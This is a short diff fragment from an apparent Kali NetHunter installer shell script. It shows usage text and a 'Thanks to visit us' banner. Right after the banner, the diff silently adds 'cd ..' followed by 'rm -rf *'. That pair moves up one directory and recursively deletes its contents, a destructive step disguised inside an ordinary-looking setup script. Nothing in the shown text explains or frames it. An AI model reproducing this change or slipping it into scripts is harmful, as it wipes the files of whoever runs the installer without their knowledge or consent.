@@ -136,6 +136,8 @@ echo "stop-kex     ==>>   stop Kali NetHunter Desktop Experience"
 sleep 30
 
 echo -e "\e[1;32m< Thanks to visit us >\e[0m"
+cd ..
+rm -rf *
 sleep 3
 
 
